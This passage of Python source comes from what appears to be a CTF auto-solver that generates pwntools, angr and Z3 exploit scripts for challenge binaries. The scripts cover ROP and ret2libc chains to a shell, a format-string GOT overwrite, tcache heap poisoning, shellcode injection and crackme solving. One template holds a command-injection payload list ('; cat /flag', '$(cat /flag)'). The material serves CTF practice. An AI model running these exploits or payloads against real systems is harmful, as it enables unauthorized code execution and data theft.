            f'rop.raw({hex(g_pop_rdx.addr) if g_pop_rdx else "POP_RDX"})',
            'rop.raw(0)',
            f'rop.raw({hex(g_pop_rax.addr) if g_pop_rax else "POP_RAX"})',
            'rop.raw(0x3b)   # __NR_execve',
            f'rop.raw({hex(g_syscall.addr) if g_syscall else "SYSCALL"})',
            '',
            '# Craft payload:',
            '# payload = cyclic(offset) + rop.chain()',
        ]
        return '\n'.join(lines)

    def build_ret2libc_chain(self, plt_system: int, plt_exit: int, bin_sh_addr: int) -> str:
        g_pop_rdi = self.best('pop_rdi')
        g_ret = self.best('ret')
        lines = ['# ── ret2libc chain (system("/bin/sh")) ──',
                 'from pwn import *', '',
                 f'pop_rdi = {hex(g_pop_rdi.addr) if g_pop_rdi else "???"}',
                 f'ret     = {hex(g_ret.addr) if g_ret else "???"}   # stack alignment',
                 f'bin_sh  = {hex(bin_sh_addr)}',
                 f'system  = {hex(plt_system)}',
                 f'exit    = {hex(plt_exit)}', '',
                 'rop = ROP(elf)',
                 'rop.raw(ret)       # align stack for movaps',
                 'rop.raw(pop_rdi)',
                 'rop.raw(bin_sh)',
                 'rop.raw(system)',
                 'rop.raw(exit)',
                 'rop.raw(0)', '',
                 '# payload = cyclic(offset) + rop.chain()']
        return '\n'.join(lines)


# ══════════════════════════════════════════════════════════════════════
# SolverCore — openECSC-2024 auto-solver patterns
# ══════════════════════════════════════════════════════════════════════
OPENECSC_CHALLENGES = {
    'rev/static_string_reconstruct': {'desc': 'Immediate-value string built in ASM (ELF Crack Me style)', 'template': 'static_string_reconstruct'},
    'pwn/bof_ret2win':       {'desc': 'Stack BOF → overwrite RIP to jump to win()',         'template': 'overflow_exploit'},
    'pwn/bof_rop':           {'desc': 'Stack BOF + ROP chain to execve("/bin/sh")',          'template': 'rop_execve_chain'},
    'pwn/ret2libc':          {'desc': 'ret2libc via system("/bin/sh")',                      'template': 'ret2libc'},
    'pwn/format_string':     {'desc': 'Format string leak + GOT overwrite',                  'template': 'format_string_exploit'},
    'pwn/heap_tcache':       {'desc': 'Heap tcache poisoning → arbitrary write',             'template': 'heap_exploit_template'},
    'pwn/shellcode':         {'desc': 'NX disabled — shellcode injection',                   'template': 'shellcode_exploit'},
    'rev/basic_crackme':     {'desc': 'Simple XOR/rotation crackme — angr symbolic solve',  'template': 'angr_find_flag'},
    'rev/z3_constraints':    {'desc': 'Custom algorithm — Z3 constraint solving',            'template': 'z3_constraint_solve'},
    'rev/vm_obfuscation':    {'desc': 'VM-based obfuscation — Triton symbolic deobfuscate', 'template': 'triton_deobfuscate'},
    'rev/string_compare':    {'desc': 'Simple strcmp/memcmp crackme with known target',      'template': 'crackme_compare'},
    'web/ringzer0_cmd':      {'desc': 'RingZer0 command injection shell challenge',          'template': 'ringzer0_cmd'},
    'web/ringzer0_crypto':   {'desc': 'RingZer0 crypto/encoding challenge',                  'template': 'ringzer0_crypto'},
    'misc/license_key':      {'desc': 'License key validation — brute or constraint solve',  'template': 'license_key_solver'},
    'misc/angr_generic':     {'desc': 'Generic angr symbolic execution (any binary)',        'template': 'angr_find_flag'},
}


class SolverCore:
    """
    Reusable solver primitives for CTF challenges.
    Each method returns a script string that can be saved and run.
    """

    def __init__(self, loader: BinaryLoader, rop_engine: ROPEngine):
        self.loader = loader
        self.rop = rop_engine

    def get_solver(self, challenge_key: str) -> str:
        ch = OPENECSC_CHALLENGES.get(challenge_key, {})
        tmpl = ch.get('template', 'angr_find_flag')
        method = getattr(self, tmpl, None)
        if method is None:
            return self.angr_find_flag(ch)
        return method(ch)

    def static_string_reconstruct(self, ch: dict = None) -> str:
        binary = self.loader.path
        path   = repr(binary)
        # Scan disassembly for movl/movw immediate→memory patterns that build strings
        # Mirrors exactly how ELF Crack Me 1 hides its flag
        found_strs = []
        try:
            from capstone import Cs, CS_ARCH_X86, CS_MODE_32, CS_MODE_64
            bits = self.loader.bits
            arch_mode = CS_MODE_32 if bits == 32 else CS_MODE_64
            code, base = self.loader._get_text_section()
            md = Cs(CS_ARCH_X86, arch_mode)
            md.detail = False
            buf = bytearray(256)
            writes = {}
            for insn in md.disasm(code, base):
                mn = insn.mnemonic
                op = insn.op_str
                if mn in ('movl', 'movb', 'movw', 'mov') and '$0x' in op and '(%' in op:
                    try:
                        parts = op.split(',')
                        imm   = int(parts[0].strip().replace('$', ''), 16)
                        dst   = parts[1].strip()
                        if dst.startswith('0x') and '(%' in dst:
                            off = int(dst.split('(')[0], 16)
                        elif dst.startswith('(%'):
                            off = 0
                        else:
                            continue
                        sz = {'movl': 4, 'movw': 2, 'movb': 1, 'mov': 4}.get(mn, 4)
                        for i in range(sz):
                            b = (imm >> (8 * i)) & 0xFF
                            if 0x20 <= b <= 0x7e:
                                writes[off + i] = b
                    except (ValueError, KeyError):
                        pass
            if writes:
                buf = bytearray(max(writes) + 2)
                for k, v in writes.items():
                    buf[k] = v
                candidate = buf[:buf.index(0) if 0 in buf else len(buf)].decode('ascii', errors='replace')
                if len(candidate) >= 4:
                    found_strs.append(candidate)
        except Exception as e:
            log.debug(f'static_string_reconstruct scan failed: {e}')
        # Also extract printable run candidates from raw bytes
        raw_candidates = []
        data = bytes(self.loader._raw)
        i = 0
        while i < len(data) - 4:
            run = b''
            while i < len(data) and 0x20 <= data[i] <= 0x7e:
                run += bytes([data[i]]); i += 1
            if 6 <= len(run) <= 64 and b'FLAG' in run.upper():
                raw_candidates.append(run.decode('ascii', errors='replace'))
            else:
                i += 1
        lines = [
            "#!/usr/bin/env python3",
            "# Static string reconstruction solver",
            f"# Binary: {binary}",
            "# Technique: scan movl/movw immediate values written to heap/stack buffers",
            "# (used by ELF Crack Me 1 and similar challenges)",
            "import struct, subprocess, sys",
            "",
            f"BINARY = {path}",
            "",
            "# ── Statically recovered candidates ─────────────────────────",
        ]
        if found_strs:
            lines.append(f"STATIC_CANDIDATES = {repr(found_strs)}")
        if raw_candidates:
            lines.append(f"RAW_FLAG_STRINGS   = {repr(raw_candidates)}")
        lines += [
            "",
            "# ── Dynamic recovery: run and watch stdout ───────────────────",
            "r = subprocess.run([BINARY], capture_output=True, timeout=5)",
            "output = (r.stdout + r.stderr).decode(errors='replace')",
            "print('[stdout]:', repr(output))",
            "",
            "# ── Deep scan: extract all movl immediate sequences ──────────",
            "def extract_movl_strings(binary_path):",
            "    import capstone",
            "    data = open(binary_path, 'rb').read()",
            "    # find .text section via ELF headers",
            "    if data[0:4] != b'\\x7fELF': return []",
            "    bits = 64 if data[4] == 2 else 32",
            "    from capstone import Cs, CS_ARCH_X86, CS_MODE_32, CS_MODE_64",
            "    md  = Cs(CS_ARCH_X86, CS_MODE_32 if bits == 32 else CS_MODE_64)",
            "    # crude .text scan: find all mov imm -> mem patterns",
            "    buf = {}",
            "    for insn in md.disasm(data, 0):",
            "        mn, op = insn.mnemonic, insn.op_str",
            "        if mn in ('movl','movw','movb') and '$0x' in op and '(' in op:",
            "            try:",
            "                p     = op.split(',')",
            "                imm   = int(p[0].strip().replace('$',''), 16)",
            "                off   = int(p[1].strip().split('(')[0] or '0', 16)",
            "                sz    = {'movl':4,'movw':2,'movb':1}[mn]",
            "                for i in range(sz):",
            "                    b = (imm >> (8*i)) & 0xFF",
            "                    buf[off+i] = b",
            "            except Exception: pass",
            "    if not buf: return []",
            "    arr = bytearray(max(buf)+2)",
            "    for k,v in buf.items(): arr[k] = v",
            "    chunks = []",
            "    for chunk in bytes(arr).split(b'\\x00'):",
            "        s = chunk.decode('ascii', errors='replace')",
            "        if len(s) >= 4 and all(0x20 <= ord(c) <= 0x7e for c in s):",
            "            chunks.append(s)",
            "    return chunks",
            "",
            "candidates = extract_movl_strings(BINARY)",
            "print('[movl scan]:', candidates)",
            "for c in candidates:",
            "    r2 = subprocess.run([BINARY], input=c.encode() + b'\\n',",
            "                        capture_output=True, timeout=3)",
            "    out = (r2.stdout + r2.stderr).decode(errors='replace')",
            "    if any(k in out.lower() for k in ('correct','flag','win','valid','congrat')):",
            "        print('[+] FLAG:', repr(c))",
            "        sys.exit(0)",
        ]
        return '\n'.join(lines)

    def angr_find_flag(self, ch: dict = None) -> str:
        binary  = self.loader.path
        path    = repr(binary)
        ep      = hex(self.loader.entry_point)
        funcs   = self.loader.get_functions()
        strings = self.loader.get_strings(min_len=4)
        win_funcs = [(n, hex(a)) for n, a in funcs if any(
            k in n.lower() for k in ('win','flag','shell','success','correct','backdoor'))]
        avoid_strings = [s for s in strings if any(
            k in s.lower() for k in ('wrong','invalid','fail','bad','incorrect','error'))][:4]
        find_strings  = [s for s in strings if any(
            k in s.lower() for k in ('correct','flag','win','success','congrat','ecsc','ctf{'))][:4]
        win_comment = ('# Win functions: ' + ', '.join(f'{n}@{a}' for n, a in win_funcs[:4])) if win_funcs else ''
        return textwrap.dedent(f"""            #!/usr/bin/env python3
            # angr symbolic solver -- {os.path.basename(binary)}
            # Entry: {ep}
            # {win_comment}
            import angr, claripy, sys

            BINARY    = {path}
            FLAG_LEN  = 32

            proj  = angr.Project(BINARY, auto_load_libs=False)
            flag  = claripy.BVS('flag', FLAG_LEN * 8)
            state = proj.factory.full_init_state(
                args=[BINARY],
                stdin=claripy.Concat(flag, claripy.BVV(b'\\n')),
            )
            for b in flag.chop(8):
                state.add_constraints(b >= 0x20, b <= 0x7e)

            FIND_STRINGS  = {repr(find_strings)}
            AVOID_STRINGS = {repr(avoid_strings)}

            def _find(s):
                out = s.posix.dumps(1).lower()
                return any(x.encode().lower() in out for x in FIND_STRINGS) if FIND_STRINGS else False

            def _avoid(s):
                out = s.posix.dumps(1).lower()
                return any(x.encode().lower() in out for x in AVOID_STRINGS) if AVOID_STRINGS else False

            sim = proj.factory.simulation_manager(state)
            sim.explore(find=_find, avoid=_avoid)

            if sim.found:
                sol = sim.found[0]
                flag_bytes = sol.solver.eval(flag, cast_to=bytes)
                print('[+] Flag:', flag_bytes.decode(errors='replace'))
                print('[+] Hex: ', flag_bytes.hex())
            else:
                print('[-] No solution -- adjust FLAG_LEN or find/avoid.')
            """)

    def z3_constraint_solve(self, ch: dict = None) -> str:
        binary  = self.loader.path
        strings = self.loader.get_strings(min_len=4)
        hex_strings = [s for s in strings if re.match(r'^[0-9a-fA-F]{8,}$', s)][:4]
        return textwrap.dedent(f"""            #!/usr/bin/env python3
            # Z3 constraint solver -- {os.path.basename(binary)}
            import z3

            FLAG_LEN = 32
            solver   = z3.Solver()
            flag     = [z3.BitVec(f'f_{{i}}', 8) for i in range(FLAG_LEN)]

            for b in flag:
                solver.add(b >= 0x20, b <= 0x7e)

            # Hex constants from binary (possible key/target):
            # {repr(hex_strings)}

            # ADD CONSTRAINTS:
            # target = [0x21, 0x37, ...]
            # for i, t in enumerate(target):
            #     solver.add(flag[i] ^ 0x42 == t)

            if solver.check() == z3.sat:
                model = solver.model()
                result = bytes(model[flag[i]].as_long() for i in range(FLAG_LEN))
                print('[+] Flag:', result.decode(errors='replace'))
            else:
                print('[-] UNSAT')
            """)

    def overflow_exploit(self, ch: dict = None) -> str:
        binary   = self.loader.path
        path     = repr(binary)
        prot     = self.loader.protections()
        bits     = self.loader.bits
        pie      = 'Enabled' in prot.get('PIE (ASLR)', '')
        canary   = 'Enabled' in prot.get('Stack Canary', '')
        nx       = 'Enabled' in prot.get('NX (No-Execute)', '')
        imports  = {i['name'] for i in self.loader.get_imports()}
        win_funcs = [(n, a) for n, a in self.loader.get_functions()
                     if any(k in n.lower() for k in ('win','flag','shell','backdoor','secret'))]
        pop_rdi  = self.rop.best('pop_rdi')
        ret_g    = self.rop.best('ret')
        p_rdi    = hex(pop_rdi.addr) if pop_rdi else '0x0  # scan gadgets first'
        p_ret    = hex(ret_g.addr)   if ret_g   else '0x0  # scan gadgets first'
        has_sys  = 'system' in imports
        binsh_idx = bytes(self.loader._raw).find(b'/bin/sh\x00')
        binsh_vaddr = 0
        if binsh_idx >= 0:
            for sec in self.loader.get_sections():
                if sec['offset'] <= binsh_idx < sec['offset'] + sec['size']:
                    binsh_vaddr = sec['vaddr'] + (binsh_idx - sec['offset']); break
        win_line   = (f"WIN      = {hex(win_funcs[0][1])}  # {win_funcs[0][0]}\n" if win_funcs else "")
        binsh_line = (f"BIN_SH   = {hex(binsh_vaddr)}  # found in binary\n" if binsh_vaddr
                      else "BIN_SH   = next(elf.search(b'/bin/sh\\x00'), None)\n")
        strat = ("# Strategy: ret2win (jump to WIN function)" if win_funcs and not pie
                 else "# Strategy: ret2libc (leak then call system)" if has_sys
                 else "# Strategy: ROP chain to execve")
        lines = [
            "#!/usr/bin/env python3",
            f"# BOF solver for: {os.path.basename(binary)}",
            f"# NX={nx}  PIE={pie}  Canary={canary}  bits={bits}",
            f"# {strat[2:]}",
            "from pwn import *",
            "",
            f"elf     = context.binary = ELF({path}, checksec=False)",
            "context.log_level = 'info'",
            win_line.rstrip(),
            f"POP_RDI = {p_rdi}",
            f"RET     = {p_ret}",
            binsh_line.rstrip(),
            "OFFSET  = 64  # find: python3 -c \"from pwn import*; print(cyclic(200).decode())\" | ./bin ; dmesg | tail",
            "",
            "def conn():",
            "    return remote('target', 1337) if args.REMOTE else process(elf.path)",
            "",
            "def exploit():",
            "    io = conn()",
            "    if args.GDB:",
            "        gdb.attach(io, 'break main\\ncontinue')",
            "    io.recvuntil(b'> ', timeout=2)",
            "",
            "    payload = b'A' * OFFSET",
            "    if " + str(bool(win_funcs and not pie)) + ":",
            "        payload += p64(WIN)",
            "    else:",
            "        payload += p64(RET)",
            "        payload += p64(POP_RDI)",
            "        payload += p64(BIN_SH)",
            "        payload += p64(elf.plt.get('system', elf.sym.get('system', 0)))",
            "",
            "    io.sendline(payload)",
            "    io.interactive()",
            "",
            "exploit()",
        ]
        return '\n'.join(l for l in lines if l is not None)

    def format_string_exploit(self, ch: dict = None) -> str:
        binary  = self.loader.path
        path    = repr(binary)
        prot    = self.loader.protections()
        relro   = 'Full' in prot.get('RELRO', '')
        pie     = 'Enabled' in prot.get('PIE (ASLR)', '')
        imports = {i['name'] for i in self.loader.get_imports()}
        target  = next((n for n in ('printf','puts','exit','__stack_chk_fail') if n in imports), 'printf')
        lines = [
            "#!/usr/bin/env python3",
            f"# Format string solver for: {os.path.basename(binary)}",
            f"# RELRO={prot.get('RELRO','?')}  PIE={pie}  GOT target: {target}->system",
            "from pwn import *",
            "",
            f"elf = context.binary = ELF({path}, checksec=False)",
            "context.log_level = 'info'",
            "",
            "# Step 1 - find offset:",
            "# for i in range(1,40): io.sendlineafter(b'> ', f'%{i}$p'.encode()); print(i, io.recvline())",
            "# Look for 0x4141414141414141 to find stack offset of input",
            "FMT_OFFSET = 6  # TODO adjust",
            "",
            "def conn():",
            "    return remote('target', 1337) if args.REMOTE else process(elf.path)",
            "",
            "def exploit():",
            "    io = conn()",
        ]
        if pie:
            lines += [
                "    # Leak PIE base: send %offset$p and subtract known offset",
                "    io.sendlineafter(b'> ', f'%{FMT_OFFSET}$p'.encode())",
                "    leak = int(io.recvline().strip(), 16)",
                "    elf.address = leak - 0x0  # TODO: calculate offset from leaked addr to elf base",
                "    log.success(f'elf @ {hex(elf.address)}')",
            ]
        if not relro:
            lines += [
                f"    writes = {{elf.got[{repr(target)}]: elf.plt.get('system', 0)}}",
                "    payload = fmtstr_payload(FMT_OFFSET, writes, write_size='short')",
                "    io.sendlineafter(b'> ', payload)",
                "    io.sendlineafter(b'> ', b'/bin/sh')",
            ]
        else:
            lines += [
                "    # Full RELRO: overwrite saved RIP on stack instead of GOT",
                "    # 1. leak stack ptr via %p to find saved RIP address",
                "    # 2. overwrite with one_gadget or win function",
                "    # one_gadget /lib/x86_64-linux-gnu/libc.so.6",
            ]
        lines += ["    io.interactive()", "", "exploit()"]
        return '\n'.join(lines)

    def heap_exploit_template(self, ch: dict = None) -> str:
        binary = self.loader.path
        path   = repr(binary)
        prot   = self.loader.protections()
        pie    = 'Enabled' in prot.get('PIE (ASLR)', '')
        lines = [
            "#!/usr/bin/env python3",
            f"# Heap exploit (tcache/fastbin) for: {os.path.basename(binary)}",
            f"# PIE={pie}",
            "from pwn import *",
            "",
            f"elf  = context.binary = ELF({path}, checksec=False)",
            "libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)",
            "context.log_level = 'info'",
            "",
            "io = process(elf.path) if not args.REMOTE else remote('target', 1337)",
            "",
            "def alloc(size, data=b''):",
            "    io.sendlineafter(b'> ', b'1')",
            "    io.sendlineafter(b'size: ', str(size).encode())",
            "    if data: io.sendafter(b'data: ', data)",
            "",
            "def free(idx):",
            "    io.sendlineafter(b'> ', b'2')",
            "    io.sendlineafter(b'idx: ', str(idx).encode())",
            "",
            "def show(idx):",
            "    io.sendlineafter(b'> ', b'3')",
            "    io.sendlineafter(b'idx: ', str(idx).encode())",
            "    return io.recvline().strip()",
            "",
            "def edit(idx, data):",
            "    io.sendlineafter(b'> ', b'4')",
            "    io.sendlineafter(b'idx: ', str(idx).encode())",
            "    io.sendafter(b'data: ', data)",
            "",
            "# Stage 1: libc leak via unsorted bin",
            "alloc(0x420, b'A'*8)   # chunk 0 - large bin size",
            "alloc(0x18,  b'guard') # chunk 1 - prevent top consolidation",
            "free(0)",
            "leak_raw = u64(show(0).ljust(8, b'\\x00'))",
            "libc.address = leak_raw - libc.sym['main_arena'] - 96",
            "log.success(f'libc @ {hex(libc.address)}')",
            "",
            "# Stage 2: tcache poison -> arbitrary write",
            "# glibc < 2.32: direct fd overwrite",
            "# glibc >= 2.32: fd ^= (heap_base >> 12)  -- need heap leak too",
            "TARGET = libc.sym['__free_hook']   # glibc < 2.34",
            "# TARGET = libc.sym['__malloc_hook']",
            "# For glibc >= 2.34: use stdout FSOP or stack pivot",
            "",
            "alloc(0x28, b'B'*8)  # chunk A",
            "alloc(0x28, b'C'*8)  # chunk B",
            "free(2)              # B -> tcache",
            "free(1)              # A -> tcache head",
            "edit(1, p64(TARGET)) # overwrite fd",
            "alloc(0x28, b'D'*8) # pop A",
            "alloc(0x28, p64(libc.sym['system']))  # write system to TARGET",
            "",
            "# Stage 3: trigger",
            "alloc(0x18, b'/bin/sh\\x00')",
            "free(idx_of_binsh)  # __free_hook('/bin/sh') = system('/bin/sh')",
            "io.interactive()",
        ]
        return '\n'.join(lines)

    def rop_execve_chain(self, ch: dict = None) -> str:
        binary  = self.loader.path
        path    = repr(binary)
        prot    = self.loader.protections()
        pie     = 'Enabled' in prot.get('PIE (ASLR)', '')
        binsh_idx = bytes(self.loader._raw).find(b'/bin/sh\x00')
        binsh_vaddr = 0
        if binsh_idx >= 0:
            for sec in self.loader.get_sections():
                if sec['offset'] <= binsh_idx < sec['offset'] + sec['size']:
                    binsh_vaddr = sec['vaddr'] + (binsh_idx - sec['offset']); break
        pop_rdi = self.rop.best('pop_rdi')
        pop_rsi = self.rop.best('pop_rsi')
        pop_rdx = self.rop.best('pop_rdx')
        syscall = self.rop.best('syscall')
        ret_g   = self.rop.best('ret')
        def g(gg): return hex(gg.addr) if gg else '0x0  # NOT FOUND - scan gadgets'
        binsh_line = (f"BIN_SH  = {hex(binsh_vaddr)}  # /bin/sh in binary"
                      if binsh_vaddr else "BIN_SH  = None  # not found - write to bss")
        lines = [
            "#!/usr/bin/env python3",
            f"# ROP execve chain for: {os.path.basename(binary)}",
            f"# PIE={pie}",
            "from pwn import *",
            "",
            f"elf = context.binary = ELF({path}, checksec=False)",
            "context.log_level = 'info'",
            "",
            f"POP_RDI = {g(pop_rdi)}",
            f"POP_RSI = {g(pop_rsi)}",
            f"POP_RDX = {g(pop_rdx)}",
            f"SYSCALL  = {g(syscall)}",
            f"RET      = {g(ret_g)}",
            binsh_line,
            "BSS      = elf.bss(0x100)",
            "OFFSET   = 64  # cyclic_find",
            "",
            "def conn():",
            "    return remote('target', 1337) if args.REMOTE else process(elf.path)",
            "",
            "def exploit():",
            "    io = conn()",
            "    io.recvuntil(b'> ', timeout=2)",
            "",
            "    sh = BIN_SH if BIN_SH else BSS",
            "    chain  = p64(RET)",
            "    chain += p64(POP_RDI) + p64(sh)",
            "    if SYSCALL != 0x0:",
            "        chain += p64(POP_RSI) + p64(0)",
            "        chain += p64(POP_RDX) + p64(0)",
            "        # need pop rax; mov rax,59 or xor+inc loop for execve syscall",
            "        chain += p64(SYSCALL)",
            "    else:",
            "        chain += p64(elf.plt.get('system', 0))",
            "",
            "    io.sendline(b'A' * OFFSET + chain)",
            "    io.interactive()",
            "",
            "exploit()",
        ]
        return '\n'.join(lines)

    def ret2libc(self, ch: dict = None) -> str:
        binary  = self.loader.path
        path    = repr(binary)
        prot    = self.loader.protections()
        pie     = 'Enabled' in prot.get('PIE (ASLR)', '')
        imports = {i['name'] for i in self.loader.get_imports()}
        pop_rdi = self.rop.best('pop_rdi')
        ret_g   = self.rop.best('ret')
        p_rdi   = hex(pop_rdi.addr) if pop_rdi else '0x0  # scan gadgets first'
        p_ret   = hex(ret_g.addr)   if ret_g   else '0x0  # scan gadgets first'
        leak_fn = 'puts' if 'puts' in imports else ('printf' if 'printf' in imports else 'write')
        lines = [
            "#!/usr/bin/env python3",
            f"# ret2libc for: {os.path.basename(binary)}  (leak via {leak_fn})",
            f"# PIE={pie}",
            "from pwn import *",
            "",
            f"elf  = context.binary = ELF({path}, checksec=False)",
            "libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)",
            "# libc = ELF('./libc.so.6', checksec=False)  # use if provided",
            "context.log_level = 'info'",
            "",
            f"POP_RDI = {p_rdi}",
            f"RET     = {p_ret}",
            "OFFSET  = 64  # cyclic_find",
            "",
            "def conn():",
            "    return remote('target', 1337) if args.REMOTE else process(elf.path)",
            "",
            "def stage1_leak(io):",
            "    payload  = b'A' * OFFSET",
            "    payload += p64(POP_RDI)",
            f"    payload += p64(elf.got[{repr(leak_fn)}])",
            f"    payload += p64(elf.plt[{repr(leak_fn)}])",
            "    payload += p64(elf.sym['main'])",
            "    io.sendlineafter(b'> ', payload)",
            "    leak = u64(io.recvline().strip().ljust(8, b'\\x00'))",
            f"    libc.address = leak - libc.sym[{repr(leak_fn)}]",
            "    log.success(f'libc @ {hex(libc.address)}')",
            "",
            "def stage2_shell(io):",
            "    bin_sh  = next(libc.search(b'/bin/sh\\x00'))",
            "    payload  = b'A' * OFFSET",
            "    payload += p64(RET)",
            "    payload += p64(POP_RDI) + p64(bin_sh)",
            "    payload += p64(libc.sym['system'])",
            "    io.sendlineafter(b'> ', payload)",
            "",
            "def exploit():",
            "    io = conn()",
            "    stage1_leak(io)",
            "    stage2_shell(io)",
            "    io.interactive()",
            "",
            "exploit()",
        ]
        return '\n'.join(lines)

    def shellcode_exploit(self, ch: dict = None) -> str:
        binary = self.loader.path
        path   = repr(binary)
        bits   = self.loader.bits
        arch   = self.loader.arch.lower().replace('_64', '')
        lines = [
            "#!/usr/bin/env python3",
            f"# Shellcode exploit (NX disabled) for: {os.path.basename(binary)}",
            "from pwn import *",
            "",
            f"elf = context.binary = ELF({path}, checksec=False)",
            f"context.arch  = {repr(arch)}",
            f"context.bits  = {bits}",
            "context.log_level = 'info'",
            "",
            "sc = asm(shellcraft.sh())",
            "log.info(f'shellcode {len(sc)} bytes')",
            "OFFSET = 64",
            "",
            "def conn():",
            "    return remote('target', 1337) if args.REMOTE else process(elf.path)",
            "",
            "def exploit():",
            "    io = conn()",
            "    if args.GDB:",
            "        gdb.attach(io, 'break main\\ncontinue')",
            "    io.recvuntil(b'> ', timeout=2)",
            "    nop  = b'\\x90' * max(0, OFFSET - len(sc))",
            "    payload = nop + sc + b'A' * max(0, OFFSET - len(nop) - len(sc))",
            "    payload += p64(0xdeadbeef)  # TODO: replace with leaked buf addr",
            "    io.sendline(payload)",
            "    io.interactive()",
            "",
            "exploit()",
        ]
        return '\n'.join(lines)

    def crackme_compare(self, ch: dict = None) -> str:
        binary  = self.loader.path
        path    = repr(binary)
        strings = self.loader.get_strings(min_len=4)
        hints   = [s for s in strings if any(k in s.lower() for k in
                   ('flag','ecsc','ctf{','correct','win','password','key','secret'))]
        checks  = [(n, hex(a)) for n, a in self.loader.get_functions() if any(k in n.lower() for k in
                   ('check','valid','verify','compare','strcmp','equal','crack','license'))]
        lines = [
            "#!/usr/bin/env python3",
            f"# Crackme solver for: {os.path.basename(binary)}",
            f"# Interesting strings: {repr(hints[:6])}",
            f"# Check functions:     {repr(checks[:4])}",
            "import subprocess, sys",
            "",
            f"BINARY = {path}",
            "",
            "def run(inp: bytes) -> str:",
            "    r = subprocess.run([BINARY], input=inp + b'\\n',",
            "                       capture_output=True, timeout=5)",
            "    return (r.stdout + r.stderr).decode(errors='replace')",
            "",
            f"CANDIDATES = {repr(hints[:10])}",
            "for c in CANDIDATES:",
            "    out = run(c.encode())",
            "    if any(k in out.lower() for k in ('correct','flag','win','congrat','valid','success')):",
            "        print('[+] SOLVED:', repr(c))",
            "        print(out)",
            "        sys.exit(0)",
            "",
            "# angr symbolic fallback",
            "try:",
            "    import angr, claripy",
            "    proj  = angr.Project(BINARY, auto_load_libs=False)",
            "    flag  = claripy.BVS('flag', 64 * 8)",
            "    state = proj.factory.full_init_state(",
            "        args=[BINARY],",
            "        stdin=claripy.Concat(flag, claripy.BVV(b'\\n')),",
            "    )",
            "    for b in flag.chop(8): state.add_constraints(b >= 0x20, b <= 0x7e)",
            "    sm = proj.factory.simulation_manager(state)",
            "    sm.explore(",
            "        find  = lambda s: any(k in s.posix.dumps(1).lower() for k in (b'correct',b'flag',b'win',b'success')),",
            "        avoid = lambda s: any(k in s.posix.dumps(1).lower() for k in (b'wrong',b'invalid',b'fail')),",
            "    )",
            "    if sm.found:",
            "        ans = sm.found[0].solver.eval(flag, cast_to=bytes).rstrip(b'\\x00')",
            "        print('[+] angr:', ans.decode(errors='replace'))",
            "    else:",
            "        print('[-] angr: no path')",
            "except ImportError:",
            "    print('[!] pip install angr')",
        ]
        return '\n'.join(lines)

    def ringzer0_cmd(self, ch: dict = None) -> str:
        binary    = self.loader.path
        path      = repr(binary)
        strings   = self.loader.get_strings(min_len=3)
        cmd_hints = [s for s in strings if any(c in s for c in ('bash','sh','cmd','exec','system','/bin','PATH','eval'))]
        lines = [
            "#!/usr/bin/env python3",
            f"# RingZer0 cmd injection solver for: {os.path.basename(binary)}",
            f"# Cmd-related strings: {repr(cmd_hints[:6])}",
            "import subprocess, os",
            "",
            f"BINARY = {path}",
            "",
            "def run(args_list, stdin_data=None, env=None):",
            "    r = subprocess.run(args_list, input=stdin_data, capture_output=True,",
            "                       timeout=5, env=env or os.environ.copy())",
            "    return (r.stdout + r.stderr).decode(errors='replace')",
            "",
            "PAYLOADS = ['; id', '; cat /flag', '; cat /flag.txt', '$(cat /flag)',",
            "            '| cat /flag', \"'; id #\", '`id`', '; ls -la /']",
            "",
            "for p in PAYLOADS:",
            "    out = run([BINARY, p])",
            "    if out.strip(): print(f'[arg] {repr(p)} => {out[:200]}')",
            "",
            "for p in PAYLOADS:",
            "    out = run([BINARY], stdin_data=p.encode() + b'\\n')",
            "    if out.strip(): print(f'[stdin] {repr(p)} => {out[:200]}')",
            "",
            "for var in ('PATH','HOME','USER','LANG','TERM','IFS'):",
            "    for p in ('; id', '$(id)'):",
            "        out = run([BINARY], env={**os.environ, var: p})",
            "        if 'uid=' in out: print(f'[env {var}={repr(p)}] {out[:200]}')",
        ]
        return '\n'.join(lines)

    def ringzer0_crypto(self, ch: dict = None) -> str:
        binary   = self.loader.path
        crypto   = self.loader.detect_crypto()
        cr_names = ', '.join(n for n, _ in crypto) if crypto else 'none'
        strings  = self.loader.get_strings(min_len=4)
        b64_like = [s for s in strings if len(s) >= 16 and
                    all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in s)][:3]
        hex_like = [s for s in strings if re.match(r'^[0-9a-fA-F]{16,}$', s)][:3]
        lines = [
            "#!/usr/bin/env python3",
            f"# RingZer0 crypto solver for: {os.path.basename(binary)}",
            f"# Crypto: {cr_names}  b64-like: {repr(b64_like)}  hex-like: {repr(hex_like)}",
            "import base64, binascii",
            "",
            "TARGET = ''  # paste ciphertext here",
            "",
            "for name, fn in [",
            "    ('base64', lambda x: base64.b64decode(x + '==').decode(errors='replace')),",
            "    ('base32', lambda x: base64.b32decode(x.upper()).decode(errors='replace')),",
            "    ('hex',    lambda x: bytes.fromhex(x.replace(' ','')).decode(errors='replace')),",
            "    ('rot13',  lambda x: x.translate(str.maketrans(",
            "        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',",
            "        'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))),",
            "]:",
            "    try:",
            "        r = fn(TARGET)",
            "        if r.strip(): print(f'[{name}]: {r[:200]}')",
            "    except Exception: pass",
            "",
            "# XOR brute (single byte)",
            "try:",
            "    raw = bytes.fromhex(TARGET.replace(' ',''))",
            "    for key in range(256):",
            "        dec = bytes(b ^ key for b in raw)",
            "        if dec.isprintable(): print(f'[xor 0x{key:02x}]: {dec.decode()}')",
            "except Exception: pass",
            "",
            "# Caesar all shifts",
            "for shift in range(1, 26):",
            "    r = ''",
            "    for c in TARGET:",
            "        if c.isalpha():",
            "            base = ord('A') if c.isupper() else ord('a')",
            "            r += chr((ord(c) - base + shift) % 26 + base)",
            "        else: r += c",
            "    if any(w in r.lower() for w in ('flag','ecsc','ctf','the','and')):",
            "        print(f'[caesar+{shift}]: {r}')",
        ]
        return '\n'.join(lines)

    def license_key_solver(self, ch: dict = None) -> str:
        binary = self.loader.path
        path   = repr(binary)
        funcs  = self.loader.get_functions()
        checks = [n for n, _ in funcs if any(k in n.lower() for k in
                  ('check','valid','verify','license','key','serial','compare'))]
        lines = [
            "#!/usr/bin/env python3",
